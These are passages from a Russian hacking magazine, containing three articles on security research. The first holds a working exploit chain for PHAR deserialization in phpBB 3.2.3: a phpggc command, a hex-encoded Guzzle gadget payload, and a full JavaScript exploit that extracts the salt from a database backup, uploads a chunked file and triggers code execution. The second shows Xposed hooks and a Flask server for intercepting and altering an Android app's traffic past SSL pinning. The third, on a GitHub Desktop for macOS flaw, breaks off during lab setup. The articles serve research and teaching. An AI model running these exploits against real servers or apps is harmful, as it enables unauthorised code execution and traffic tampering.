зить файлы частями (chunk). Дефолтный конфиг ты можешь найти в исходни‐
ках страницы.


/phpBB3.2.3/styles/prosilver/template/plupload.html
01: <script type="text/javascript">
02: //<![CDATA[
03: phpbb.plupload = {
...
43:     config: {
44:         runtimes: 'html5',
45:         url: '{S_PLUPLOAD_URL}',
46:         max_file_size: '{FILESIZE}b',
47:         chunk_size: '{CHUNK_SIZE}b',





              Конфигура ция загрузчика файлов plupload

Видишь опцию chunk_size? Она отвечает за раз мер чанка. Если размер
файла больше, чем здесь ука зано, то файл бьется на куски. Проще все го про‐
верить такое поведение, загрузив файл соответству юще го размера. Первый
запрос выглядит примерно так.



  POST /posting.php?mode=reply&f=2&t=1 HTTP/1.1
  Host: phpbb.vh
  x‐requested‐with: XMLHttpRequest
  x‐phpbb‐using‐plupload: 1
  Content‐Type:             multipart/form‐data;             boundary=‐‐‐‐
  WebKitFormBoundary8fBKJ1ml3uW1MEF5


    ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="name"


    o_1cuermhb71s51ssljbj1d781ht5g.tar
  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="chunk"


    0
  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="chunks"


    2
  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="add_file"


    Add the file
  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="real_filename"


    test.tar
  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5
  Content‐Disposition: form‐data; name="fileupload"; filename="blob"
  Content‐Type: application/octet‐stream



  ‐‐‐‐‐‐WebKitFormBoundary8fBKJ1ml3uW1MEF5‐‐


Второй запрос имеет такой же вид за исключением инкрементированного
параметра chunk и данных из второго кус ка. Делается два отдельных зап‐
роса, а это значит, что на бэкенде должно где‐то храниться промежуточное
состояние. Немного покурив исходники plupload, обнаружим функцию han‐
dle_upload. Это обработчик зап росов загруженных фай лов.


/phpBB3.2.3/phpbb/files/types/form.php
79:     protected function form_upload($form_name)
80:     {
...
84:         $result = $this‐>plupload‐>handle_upload($form_name);
85:         if (is_array($result))
86:         {
87:             $upload = array_merge($upload, $result);
88:         }


/phpBB3.2.3/phpbb/plupload/plupload.php
14: namespace phpbb\plupload;
...
19: class plupload
20: {
...
95:     public function handle_upload($form_name)
96:     {

Здесь можно найти много интересного о файлах, заг ружаемых частями.


/phpBB3.2.3/phpbb/plupload/plupload.php
095:    public function handle_upload($form_name)
096:    {
097:        $chunks_expected = $this‐>request‐>variable('chunks', 0);
...
101:        if ($chunks_expected < 2)
102:        {
103:            return;
104:        }
...
106:        $file_name = $this‐>request‐>variable('name', '');
107:        $chunk = $this‐>request‐>variable('chunk', 0);
...
110:        $this‐>prepare_temporary_directory();
...
112:        $file_path = $this‐>temporary_filepath($file_name);
113:        $this‐>integrate_uploaded_file($form_name, $chunk, $
file_path);
...
118:        if ($chunk == $chunks_expected ‐ 1)
119:        {
120:            rename("{$file_path}.part", $file_path);

Если клиент инициализиру ет отправку файла чанками, то скрипт создаст вре‐
менный файл и сло жит в него переданные данные. Когда будет передан пос‐
ледний кусок, скрипт переименует его в соответствии с политикой phpBB.
Обрати внимание на имя временного файла {$file_path}.part. Оно имеет
расширение, вот это удача! :)
  Осталось узнать путь, по которому хра нится файл, и его название. За пер‐
вое отвечает метод prepare_temporary_directory. Здесь все просто,
по дефолту вре менные файлы складыва ются в подпапку plupload дирек‐
тории, в которой хранятся заг руженные файлы (ﬁles).


/phpBB3.2.3/phpbb/plupload/plupload.php
365:    protected function prepare_temporary_directory()
366:    {
367:        if (!file_exists($this‐>temporary_directory))
368:        {
369:            mkdir($this‐>temporary_directory);
...
383:    protected function set_default_directories()
384:    {
385:        $this‐>upload_directory = $this‐>phpbb_root_path . $this
‐>config['upload_path'];
386:        $this‐>temporary_directory = $this‐>upload_directory . '/
plupload';

Имя файла генерируется в методе temporary_filepath.


/phpBB3.2.3/phpbb/plupload/plupload.php
298:    protected function temporary_filepath($file_name)
299:    {
300:        // Must preserve the extension for plupload to work.
301:        return sprintf(
302:            '%s/%s_%s%s',
303:            $this‐>temporary_directory,
304:            $this‐>config['plupload_salt'],
305:            md5($file_name),
306:            \phpbb\files\filespec::get_extension($file_name)
307:        );
308:    }

Шаблон имени в ито ге имеет такой вид:


<конфигурационная_переменная_plupload_salt>_<md5_хеш_от_переданного_
имени_файла><оригинальное_расширение_файла>

И наконец, integrate_uploaded_file добавляет ко всему этому рас‐
ширение .part.


/phpBB3.2.3/phpbb/plupload/plupload.php
318:    protected function integrate_uploaded_file($form_name, $chunk
, $file_path)
319:    {
...
334:        $out = fopen("{$file_path}.part", $chunk == 0 ? 'wb' : '
ab');

Чем же нам это может помочь? Все прос то: если при отправке указать
количество чанков, но передать их мень ше, то временный файл будет прос то
лежать на диске и дожидаться оставшихся час тей.





  Загрузка файла по частям в phpBB. Временные файлы имеют рас‐
  ширение part

Теперь вернемся к шаблону имени файла. Из всех его частей нам неиз вестна
только переменная plupload_salt. Она хра нится в базе данных в таб лице
config.





    Переменная plupload_salt хранится в базе данных в таблице conﬁg

Но это вовсе не проб лема, если у тебя есть пра ва соз дателя форума, так
как он может делать и ска чивать резервные копии базы данных в соответству‐
ющем разделе.





  Права на создание и ска чивание резервных копий БД у пользователя
  admin

Перехватим запрос на получение содержимого таб лицы config, он нам при‐
годится при написании экспло ита.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     СТАРЫЙ САРАЙ,
     НОВЫЕ ГРАБЛИ
           ЭКСПЛУАТИРУЕМ PHAR‐ДЕСЕРИАЛИЗАЦИЮ
                                   В PHPBB





ЧАСТЬ ТРЕТЬЯ: ЦЕПОЧКА ГАДЖЕТОВ И ПОЛЕЗНАЯ НАГРУЗКА
Теперь, когда мы можем сохранять и вызывать архив PHAR, нужно разобрать‐
ся с его содержимым. Как ты помнишь, в основе этой техники десериали‐
зация, а это значит, что нам понадобится цепочка гаджетов, которая даст тре‐
буемый результат.
  При помощи поиска магичес ких методов был обнаружен любопытный
класс FileCookieJar, который создает файл пос ле завершения работы
скрипта.


/phpBB3.2.3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php
02: namespace GuzzleHttp\Cookie;
03:
04: use GuzzleHttp\Utils;
...
09: class FileCookieJar extends CookieJar
10: {
...
33:     public function __destruct()
34:     {
35:         $this‐>save($this‐>filename);
36:     }

«Так это же GuzzleHttp!» — вос кликнешь ты и будешь абсолютно прав. Этот
HTTP‐клиент на PHP — ста рый и про веренный вектор атаки.
   Автоматизируем процесс создания полезной нагрузки. Для этого вос поль‐
зуемся утилитой phpggc от ambionics. Она содержит в себе пачку популярных
гаджетов — в том числе и наш GuzzleHttp.





         Список доступных цепочек гаджетов в ути лите phpggc

К тому же не так давно раз работчики прикрутили к тул зе возможность сразу
создавать архивы PHAR и даже валидные картинки в JPEG, которые в то же
время читаются как PHAR.
  В качестве аргументов запуска нам необ ходимо указать:
 • непосредственно файл с кодом на PHP. Его нам нужно доставить
   на целевую машину. Я буду выполнять каноничный phpinfo;
 • путь, доступный на запись пользователю, от которо го работает PHP;
 • флаг, обозначающий, что мы создаем PHAR;
 • имя архива, который в итоге получится.

Сама утилита написана на PHP, так что не забывай отключить флаг «только
чтение» для PHAR при ее запус ке с помощью опции ‐dphar.readonly=0.
Таким образом, команда будет следующей:


$ php ‐dphar.readonly=0 phpggc ‐p phar ‐o evil.phar Guzzle/FW1 /var/
www/html/phpBB3/pinfo.php /q/Tools/phpggc/pinfo.php





             Создание файла PHAR с полезной нагрузкой

Учти, что дан ные будут записываться в формате JSON, такова особенность
работы Guzzle. Поэтому сос тавляй пейлоад правильно.


/phpBB3.2.3/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php
44:     public function save($filename)
45:     {
46:         $json = [];
47:         foreach ($this as $cookie) {
48:             if ($cookie‐>getExpires() && !$cookie‐>getDiscard())
{
49:                 $json[] = $cookie‐>toArray();
50:             }
51:         }
52:
53:         if (false === file_put_contents($filename, json_encode($
json))) {
54:             // @codeCoverageIgnoreStart
55:             throw new \RuntimeException("Unable to save file {
$filename}");
56:             // @codeCoverageIgnoreEnd
57:         }
58:     }

Теперь переименуем полученный файл в любой, который подойдет для заг‐
рузки в качестве аттача без проверки. Затем, используя технику с чанками,
загрузим содержимое во временный файл.





  Загрузка файла PHAR с полезной нагрузкой на сервер во временный
  файл при помощи чанков

Так  как  md5("evil.zip") —  это  aaae9cba5fdadb1f0c384934cd20d11c,
а plupload_salt в моем случае — de2623356e2cfb928d75d3798e09d0cb
и расширение файла — zip, то адрес будет таким.


files/plupload/de2623356e2cfb928d75d3798e09d0cb_aaae9cba5fdadb1f0c
384934cd20d11czip.part

По нему я смогу обнаружить PHAR, соз данный в phpggc.
  Осталось указать этот путь в качес тве ImageMagick path в настройках
форума и сохранить настройки.


phar://./../files/plupload/de2623356e2cfb928d75d3798e09d0cb_aaae9cba5
fdadb1f0c384934cd20d11czip.part





     Эксплуатация уяз вимос ти десериализации архи ва PHAR в phpBB

После этого переходим на /pinfo.php и наблюда ем страницу с информа‐
цией о PHP.





             Эксплуата ция уяз вимости увенчалась успехом


ЧАСТЬ ЧЕТВЕРТАЯ: ЭКСПЛОИТ
Теперь можно все объединить в один эксплоит. Как и ребята из RIPS, сде‐
лаем его на JavaScript.
  Разобьем задачу на нес колько шагов:
 • переход на страницу бэкапов для получения токенов формы;
 • скачивание бэкапа и получение plupload_salt;
 • отправка файла в виде чанка;
 • установка верного пути до загруженного файла в поле формы.

Скрипт будет работать со стра ницы нас троек атта чей.
  Сначала нужно объявить переменные, которые будем использовать
в работе.


var plupload_salt = '';
var form_token = '';
var creation_time = '';
var filepath = 'phar://./../files/plupload/$salt_aaae9cba5fdadb1f0c3
84934cd20d11czip.part'; // md5('evil.zip') = aaae9cba5fdadb1f0c384934
cd20d11czip

Далее обозначим содержимое файла PHAR с нагрузкой. Я использовал
обычную строку с hex‐конс трукциями.


var payload = '<?php __HALT_COMPILER(); ?>\x0d\x0a\xfe\x01\x00\x00\
x01\x00\x00\x00\x11\x00\x00\x00\x01'+'\x00'.repeat(5)+'\xc8\x01\x00\
x00O:31:"GuzzleHttp\x5cCookie\x5cFileCookieJar":4:{s:41:"\x00Guz
zleHttp\x5cCookie\x5cFileCookieJar\x00filename";s:30:"/var/www/html/
phpBB3/pinfo.php";s:52:"\x00GuzzleHttp\x5cCookie\x5cFileCookieJar\
x00storeSessionCookies";b:1;s:36:"\x00GuzzleHttp\x5cCookie\x5cCoo
kieJar\x00cookies";a:1:{i:0;O:27:"GuzzleHttp\x5cCookie\x5cSetCookie":
1:{s:33:"\x00GuzzleHttp\x5cCookie\x5cSetCookie\x00data";a:3:{s:7:
"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:17:"<?php phpinfo();
#";}}}s:39:"\x00GuzzleHttp\x5cCookie\x5cCookieJar\x00strictMode";N;}\
x08\x00\x00\x00test.txt\x04\x00\x00\x00K>\x10\x5c\x04\x00\x00\x00\
x0c~\x7f\xd8\xb6\x01'+'\x00'.repeat(6)+'test\xa0\x17\xd2\xe0R\xcf \
xf6T\x1d\x01X\x91(\x9dD]X\x0b>\x02\x00\x00\x00GBMB';

Затем переводим ее в мас сив вось миразрядных целых значений, чтобы избе‐
жать дальнейших проб лем при соз дании фай ла.


var byteArray = Uint8Array.from(payload, function(c){return c.codePo
intAt(0);});

Теперь необходимо получить данные со стра ницы бэкапов для последующей
отправки формы. Это легко сделать с помощью функции get() из jQuery.
Идентификатор сессии (sid) берем из текущего URL.


var sid = (new URL(document.location.href)).searchParams.get('sid');
var url = '/adm/index.php';
var getparams = {
    'i': 'acp_database',
    'sid': sid,
    'mode': 'backup'
};
$.get(url, getparams, function(data) {
    form_token = $(data).find('[name="form_token"]').val();
    creation_time = $(data).find('[name="creation_time"]').val();
});

Получили нужные токены creation_time и form_token. Теперь отправляем
POST‐запрос на загрузку бэкапа таблицы config. Из него извлекаем зна‐
чение plupload_salt. Весь следующий код выполняем в теле функции get,
чтобы соблюсти правиль ную пос ледова тельность вызовов.


if(form_token && creation_time) {
    var posturl = '/adm/index.php?i=acp_database&sid=|&mode=backup&
action=download';
    var postdata = {
        'type': 'data',
        'method': 'text',
        'where': 'download',
        'table[]': 'phpbb_config',
        'submit': 'Submit',
        'creation_time': creation_time,
        'form_token': form_token
    }
    $.post(posturl.replace("|", sid), postdata, function (data) {
        plupload_salt = data.match(/plupload_salt',\s*'(\w{32})/)[1];
        filepath = filepath.replace("$salt", plupload_salt);
    }, 'text');
}

Настало время загрузить PHAR с нагрузкой. Генерируем необходимые дан‐
ные формы.


var postdata = new FormData();
postdata.append('name', 'evil.zip');
postdata.append('chunk', 0);
postdata.append('chunks', 2);
postdata.append('add_file', 'Add the file');
postdata.append('real_filename', 'evil.zip');

А затем и файловый объ ект.


var pharfile = new File([byteArray], 'evil.zip');
postdata.append('fileupload', pharfile);

Отправляем файл и, если запрос успешно выполнен, проверя ем ответ сер‐
вера. Если и тут все нор мально, то записываем получившийся путь до архи ва
в настройку ImageMagick path.


jQuery.ajax({
    url: '/posting.php?mode=reply&f=2&t=1',
    data: postdata,
    cache: false,
    contentType: false,
    processData: false,
    method: 'POST',
    success: function(data){
        if ("id" in data) {
            $('#img_imagick').val(filepath).focus();
            $('html, body').animate({
                scrollTop: ($('#submit').offset().top)
            }, 500);
        }
    }
});

Если теперь нажать кнопку Submit, то экс плоит отработает и будет создан
файл pinfo.php в директории /var/www/html//phpBB3.
  Полный код PoC ты можешь найти на моем GitHub.


ЗАКЛЮЧЕНИЕ
Техника  PHAR‐десериализации  приоткрыла  очередной  пласт  проблем
в существующих приложениях — мое предсказание оказалось верным. Та
логика, которая раньше выглядела вполне приемлемой, теперь может пред‐
ставлять серьезную угрозу безопасности.
  Проблема касается в том числе вызовов все той же функции file_exists.
Банальная проверка существования пути на диске может закончиться выпол‐
нением произволь ного кода. А разработчики phpBB уже выпустили обновле‐
ние своего продукта, и в версии 3.2.4 уязвимость исправлена. Странно, но я
не обнаружил никакой информа ции о CVE.
  Думаю, что в ближайшее время количес тво находок, подобных этой, будет
только расти. И чтобы твой продукт не пополнил нескончаемые отря ды бюл‐
летеней безопасности, рекомендую тщательнее тес тировать код.
ВЗЛОМ
 АТАКА
 НА ПРИЛОЖЕНИЕ


        ИСПОЛЬЗУЕМ XPOSED,
      ЧТОБЫ ОБОЙТИ SSLPINNING
            НА ANDROID





                                                loonydev
                                             loony.developer@gmail.com





Есть раз ные подходы к ана лизу защищен ности приложений,
но рано или поздно все упирается в изучение взаимодей‐
ствия программы с API. Именно этот этап дает больше всего
информации о работе приложения, об используемых фун‐
кциях и собираемых данных. Но  что, если приложение
защищено SSLPinning и защита реализована на уровне?
Давай пос мотрим, что можно сделать в этом случае.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ПРЕЖДЕ ЧЕМ НАЧАТЬ
SSLPinning в мобильных приложениях реализуют, внедряя сертификат SSL
в саму программу. При открытии защищенного соединения при ложе ние
не обращается в хранилище устройства, а использует свой сертификат.
Это сразу же устраняет воз можность направить трафик на Burp и анализи‐
ровать его. Ведь для того, чтобы увидеть тра фик SSL, нужно внедрить
на устройство Burp CA, который бы подтвердил, что созданный Burp сервер
валиден и ему можно доверять.
   SSLPinning — это не панацея, очень часто появляются заметки про обход
защиты на банковских приложениях или вообще про уязвимости в самом SSL.
Но если защита построена пра вильно, то это создает огромные проблемы
для исследователя.
   Xposed представляет собой фреймворк, который внедряется в Zygote.
Это происходит при старте системы, дальше от Zygote делается .fork(), что
копирует Xposed во все запущенные процес сы. Сам фрей мворк предоставля‐
ет возможность внедрить любой код перед функци ей и после нее. Можно
изменить входящие парамет ры, заменить функцию, прочитать данные, выз‐
вать внутренние функции и мно гое другое. На самом деле на описания
и демонстрацию всех возможностей Xposed уйдет не одна статья. В общем,
если ты раньше с ним не работал, рекомендую озна комиться.
  Для работы Xposed нам понадо бит ся рутованный девайс. Для демонстра‐
ции атаки возьмем прос тое мобильное приложение, которое использует одну
из самых часто встречающихся сетевых биб лиотек. В этом приложении
отсутствует защита от SSLUnpinning, так как описанная мной атака не пыта‐
ется атаковать сертификат и сетевое общение, а нацелена на перехват дан‐
ных до покрытия их SSL. Для демонстра ции серверной стороны атаки
и бэкенда мобильного приложения используем быстрое решение в виде
Python и Flask. Все исходники ты можешь най ти на моем GitHub.
  Вернемся к проб леме перехвата трафика SSL. С помощью Xposed можно
попытаться отключить проверку сертифика та, например  «затереть» его
для программы. Но предположим, атакуемое приложение хорошо защищено,
бэкенд проверяет  валидность  защиты,  детектиру ет  попытки  перехвата
или проксирования трафика. Что делать в таком случае? Сдаться и заняться
другим приложением? А что, если перехватить трафик еще до того, как он
станет сетевым?
  С этого вопроса началось мое исследование.


             INFO

                   В статье я буду работать с Android и Xposed,
                      но  подобного  результата  можно  добиться
                        с помощью фреймворка Frida, который доступен
                      и на других ОС.



СБОР ИНФОРМАЦИИ
Для начала попробуем запустить приложение. Видим на экране кнопку SEND
и текстовое приглашение ее нажать. Нажимаем — надпись меняется сначала
на «Wait...», а после отображается «Sorry, not today». Скорее все го, отправ‐
ляется запрос, который не проходит проверку на стороне сервера. Давай
посмотрим, что происходит внутри приложения.


Ре верс APK
Отреверсим приложение, чтобы понять, какие библиотеки используются
внутри.


$ apktool d app‐debug.apk

Открываем проект в Android Studio и смотрим, что есть в smali. Сразу видим
okhttp3.


             INFO

                   Я специально использовал OkHttp, так как эта
                     библиотека лежит в основе других библиотек
                       для работы с API, нап ример Retroﬁt 2.



.method protected onCreate(Landroid/os/Bundle;)V
.line 34
iget‐object v0, p0, Lcom/loony/mitmdemo/Demo;‐>sendButton:Landroid/
widget/Button;
new‐instance v1, Lcom/loony/mitmdemo/Demo$1;
invoke‐direct {v1, p0}, Lcom/loony/mitmdemo/Demo$1;‐><init>(Lcom/
loony/mitmdemo/Demo;)V
invoke‐virtual {v0, v1}, Landroid/widget/Button;‐>setOnClickListener(
Landroid/view/View$OnClickListener;)V

Найдем класс Main, в данном случае это com.loony.mitmdemo.Demo. В on‐
Create видим создание OnClickListener. Выше от него, через v1, переда‐
ется как аргумент Demo$1. Посмотрим, что реализует этот класс.


.method public onClick(Landroid/view/View;)V
.line 41
.local v0, "sr":Lcom/loony/mitmdemo/Demo$SendRequest;
const‐string v1, "test"
filled‐new‐array {v1}, [Ljava/lang/String;
move‐result‐object v1
invoke‐virtual {v0, v1}, Lcom/loony/mitmdemo/Demo$SendRequest;‐>
execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

В конце функции onClick вызывается асинхрон ная задача, которая носит
очевидное  имя   SendRequest.  Перейдем   в   com/loony/mitmdemo/
Demo$SendRequest. Здесь мы видим множес тво обращений к okhttp3. Зна‐
чит, мы не ошиблись в предположении.
   Здесь важный этап — это определение цели для перехвата. Выгодно выб‐
рав функцию или класс, мы можем получить больше возможностей, чем
при перехвате какого‐либо дру гого объекта. Зачем,  к примеру, перех‐
ватывать экземпляр публичного ключа, если мож но перехватить все хранили‐
ще?
  Посмотрим на стандартное применение okhttp3 в проектах Android.


OkHttpClient client = new OkHttpClient();
RequestBody body = RequestBody.create(JSON, requestJson.toString());
Request request = new Request.Builder()
        .url(url)
        .post(body)
        .build();
Response response = client.newCall(request).execute();

Наиболее выгодным здесь будет перехват execute. Почему? Эта функция
возвращает Response и, очевидно, отправляет Request. Это значит, что,
перехватив  эту функцию, мы получим  возможность изменить Request
до отправки и получить Response до возвращения в основную функцию.


АТАКА
Итак, мы знаем, как реализуется общение, у нас есть представление о том,
что мы хотим перехватить и что получить. Кроме того, мы хотим как‐то прос‐
матривать эти данные и иметь возможность их изме нить до отправки
или получе ния. Для реализации это го я написал свой API, но можно было пой‐
ти дальше и подклю читься к Burp API.


        WWW

                     Базовый процесс работы с Xposed и создания
                      модулей уже был описан на множестве ресурсов.
                      Если  тебе  интересно,  можешь  ознакомиться
                       со статьями Xposed Development tutorial и «Ро‐
                       ботизирован ные  хуки.  Перехватываем  вызовы
                        в ОС Android».



MultiDex
Прежде чем приступить, я хочу показать интересный трюк — перехват фун‐
кций в приложении с MultiDex. Не зная о нем, я потратил несколько дней впус‐
тую. Дело в том, что приложение сразу не загружает весь код в память, вмес‐
то этого он разбивается на файлы dex. Если ты пыта ешься перехватить фун‐
кцию, которая находится во вто ром или даже в третьем dex, то ее нужно сна‐
чала подгрузить в память. Сделать это можно таким образом.


findAndHookMethod("android.app.Application", lpparam.classLoader,
"attach", Context.class, new XC_MethodHook() {
  @Override
  protected void afterHookedMethod(MethodHookParam param) throws
Throwable {
    if (lpparam.packageName.contains("com.loony.mitmdemo")) {
      okhttpMitm(lpparam.classLoader);
    }
  }
});

Мы перехватываем запуск приложения и получа ем экземпляр ClassLoader.
Дальше, перед тем как пос тавить хук на функцию, нужно загрузить класс,
в котором она находится.


classLoader.loadClass("class_name");


Про веряем век тор атаки
Для начала посмотрим, что мы не ошиб лись с выводами, и добавим хук,
который просто что‐то выведет в консоль. Здесь мы перехватываем не Call,
а RealCall, так как Call — это interface и у нас нет возможности перехватить
его, но мы можем перехватить его наследни ков. Наследника Call я нашел
по полученному исходному коду, после apktool.


findAndHookMethod("okhttp3.RealCall", classLoader, "execute", new
XC_MethodHook() {
  @Override
  protected void beforeHookedMethod(MethodHookParam param) throws
Throwable {
    System.out.println("Yeah");
  }
});

При нажатии на кнопку в консоли печатается Yeah — мы на верном пути. Фун‐
кция execute возвращает Response, поэтому добавим перехват after‐
HookedMethod. До вызова функции есть воз можность перехватить Request,
а после вызова функции — Response.


По лучаем дан ные
Мы нашли функцию, которая отправляет данные, что дальше? Для начала
откроем исходники okhttp3 на GitHub и пос мотрим, как выглядит RealCall.
java. Видим, что есть возможность получить Request, если из функции exe‐
cute вызвать код this.request(). Добавим эту строку в beforeHooked‐
Method.


Object request = callMethod(param.thisObject, "request");

Здесь param.thisObject — обра щение к this класса, в котором находится
перехваченная нами функция. Второй параметр — это имя функции, которую
мы вызываем, в нашем случае это Request. Дальше следуют аргу менты фун‐
кции, но у нас их нет, так как функция ничего не принимает. Чуть позже я
покажу вызов с использованием аргу ментов.
   Итак, мы получили экземпляр объекта Request, и теперь хотелось бы сде‐
лать преобразование с Object в экземпляр Request в коде хука.


Request request = (okhttp3.Request) callMethod(param.thisObject,
"request");

К сожалению, мы не можем прос то преобразовать его в экземпляр объ екта,
потому что он создан в дру гой среде и наш okhttp3.Request отличается
от того, который есть в приложении. Придет ся получать данные при помощи
вызова функций и чтения зна чений переменных через Xposed. Открываем
Request.java на GitHub и ищем функции и переменные, которые могут
содержать интересную для нас информа цию: тип запроса, хедер, путь, дан‐
ные.
  В моем случае код не обфусцирован, поэтому я могу использовать наз‐
вания функций, как на GitHub. В противо положном случае необходимо в коде,
прошедшем реверс, найти соответству ющую функцию, так как некоторые
имена могут отличаться из‐за обфускации. Я решил сразу складывать данные
в JSONObject, это понадобится дальше. Также я кодирую данные от body
в Base64, потому что функция воз вра щает массив байтов. В таком виде мы
не можем корректно выводить информа цию в терминал.


Object request_object = callMethod(param.thisObject, "request");
finalJSON.put("url", getObjectField(request_object, "url"));
finalJSON.put("method", callMethod(request_object, "method"));
Object content = "null";
Object body = callMethod(request_object, "body");
content = getObjectField(body, "val$content");
finalJSON.put("body", Base64.encodeToString((byte[]) content, Base64.
DEFAULT));
String[] namesAndValues = (String[]) getObjectField(callMethod(object
, "headers"), "namesAndValues");
finalJSON.put("headers", new JSONArray(namesAndValues));

Обрати внимание, что в коде есть преобра зова ние Object в String[].
Это можно делать для всех прос тых типов: String, int, long и других.
  Проделаем похожую процедуру с Response.


Object response_object = param.getResult();
JSONObject finalJSON = new JSONObject();
finalJSON.put("code", getObjectField(response_object, "code"));
finalJSON.put("message", getObjectField(response_object, "message"));
String body = "null";
if ((boolean) callMethod(response_object, "isSuccessful")) {
    Object source = callMethod(getObjectField(response_object, "body"
), "source");
    callMethod(source, "request", Long.MAX_VALUE);
    Object buffer = callMethod(source, "buffer");
    Object cloned_buffer = callMethod(buffer, "clone");
    body = Base64.encodeToString((byte[]) callMethod(cloned_buffer,
"readByteArray"), Base64.DEFAULT);
}
finalJSON.put("body", body);
String[] namesAndValues = (String[]) getObjectField(callMethod(object
, "headers"), "namesAndValues");
finalJSON.put("headers", new JSONArray(namesAndValues));

Теперь у нас есть два JSONObject, которые содержат данные для анализа.
Выведем в консоль то, что получилось собрать.


{
  "url": "http://192.168.1.187:2451/api/v1.0/magic",
  "method": "POST",
  "body": "eyJzZWNyZXQiOiJIYWNrZXIgaXMgZXZlcnl3aGVyZSJ9",
  "headers": [
    "TestData",
    "header_data"
  ]
}

Посмотрим, что содержится в body, рас паковав его с помощью Base64.


{
  "secret":"Hacker is everywhere"
}

Минуточку, здесь явно ошибка! Осо бо вни матель ные читатели заметят, что
имя ресурса написано неп равиль но. Но как быть, если нам нужно что‐то
поменять перед отправкой?


Де лаем под мену дан ных
Для подмены я буду отправлять собранные данные на свой API. Можно
было бы обойтись без этого, но каждый раз, когда ты вносишь изменение
в модуль Xposed, тебе необходимо перезаг ружать устройство. Если же
написать выполнение команд от C&C‐центра, то мож но избежать этих проб‐
лем.


def demo_attack(request):
  body_text = base64.b64decode(request.json['body'])
  body_text = body_text.replace("Hacker","Xakep")
  return base64.b64encode(body_text)
@app.route('/api/v1.0/request', methods=['POST'])
def request_mitm():
  if not request.json:
    abort(400)
  return json.dumps({
        'success':True,
        'task':True,
        'data':demo_attack(request)
      }), 200, {'ContentType':'application/json'}

Добавим отправку соб ранных данных на наш endpoint. Код отправки исполь‐
зует стандартный POST Request. На сервере данные меняются и отправляют‐
ся обратно. Теперь нужно их вставить в оригинальный Request.


Object mediaType = callStaticMethod(findClass("okhttp3.MediaType",
classLoader),"parse","application/json; charset=utf‐8");
byte[] newData = Base64.decode(task.getString("data"),Base64.DEFAULT)
;
Object newBody = callStaticMethod(findClass("okhttp3.RequestBody",
classLoader),"create",mediaType,newData);
setObjectField(callMethod(param.thisObject, "request"),"body",newBody
);

Теперь попробуем запус тить приложение и отправить запрос. В консоли мы
видим,   что  наш  зап рос  поменялся  и  на  экране  отображается
«Congratulations!».


ВЫВОДЫ
Мне эта идея уже не раз помогала найти проб лемы и обойти некоторые уров‐
ни защиты. Можно ли от нее защититься? Безусловно, да. Можно добавить
блокировку приложения или клиента, если был найден Xposed, добавлять
подписи к данным, которые отправляются. Можно не доверять любым зап‐
росам от клиента, даже если они идут по защищенному соединению.
  Тем не менее, имея в своем наборе такой мощ ный инс трумент, как Xposed
или Frida, ты легко обойдешь все возможные методы защиты на стороне кли‐
ента.
ВЗЛОМ
ЛОВУШКА
НА МАКОВОДА
КАК РАБОТАЕТ УЯЗВИМОСТЬ
В КЛИЕНТЕ GITHUB
ДЛЯ MACOS





          aLLy
         ONsec
        @iamsecurity





В клиенте GitHub для macOS до версии 1.3.4 beta 1 нашлась
возможность вызвать удаленное выполнение произвольных
команд простым переходом по специально сформирован‐
ной ссылке. В этой статье я расскажу о причинах возникно‐
вения и способах эксплуатации этой уязвимости.


Баг нашел Андре Баптиста (André Baptista) в рамках ивента H1‐702 2018. Уяз‐
вимость зак лючается в некорректном механизме обработки кас томной URL‐
схемы x‐github‐client://, с помощью которой происходит общение с при‐
ложением.


ТЕСТОВЫЙ СТЕНД
Так как сегодня рассматриваемая уязвимость работает только в macOS, все
манипуляции будут производиться в ней. Я ска чал виртуальную машину
для VMware с macOS 10.14.1 Mojave на одном всем известном трекере.





                Ин формация о виртуалке с macOS

Теперь нужно установить XCode и менеджер пакетов brew.


$ /usr/bin/ruby ‐e "$(curl ‐fsSL https://raw.githubusercontent.com/
Homebrew/install/master/install)"

Разработчики GitHub не предоставляют воз можность скачивать старые вер‐
сии приложения. Поэто му придется компилировать его из исходников. Кло‐
нируем репозиторий с дес ктопным клиентом GitHub и не забываем, что пос‐
ледняя уязвимая версия — 1.3.4 beta 0, ее мы и будем использовать.


$ git clone ‐‐depth=1 ‐b release‐1.3.4‐beta0 https://github.com/
desktop/desktop.git

Клиент разработан на основе фреймворка Electron и написан на TypeScript
с использованием React. А это зна чит, что нам понадобится Node.js с кучей
библиотек. Чтобы понять, как скомпилировать приложение, можно заглянуть
в файл appveyor.yml. Это конфигурацион ный файл для сервиса системы
непрерывной интеграции (CI) с таким же наз ванием AppVeyor.


/desktop-release-1.3.4-beta0/appveyor.yml
install:
  ‐ cmd: regedit /s script\default‐to‐tls12‐on‐appveyor.reg
  ‐ ps: Install‐Product node $env:nodejs_version $env:platform
  ‐ git submodule update ‐‐init ‐‐recursive
  ‐ yarn install ‐‐force

Git у нас уже имеется, а вот менеджер пакетов yarn нужно установить
с помощью brew.


$ brew install yarn

Он уже идет в комплекте с Node, но имеющаяся версия слишком нова
для нашего проекта.


/desktop-release-1.3.4-beta0/appveyor.yml
environment:
  nodejs_version: '8.11'





                  Установка менеджера пакетов yarn

Поэтому устанавливаем версию из ветки 8.х.


$ brew install node@8

Затем заменяем версию «Ноды» на более ста рую с помощью команд
link/unlink.


$ brew unlink node
$ brew link node@8 ‐‐force ‐‐overwrite





     Даунгрейд версии Node с 11.х до 8.х для корректной компиляции

Все готово для компиляции. Сначала пос ледова тельно выполняем команды
из раздела install. Это подгрузит все необ ходимые зависимос ти и пакеты.


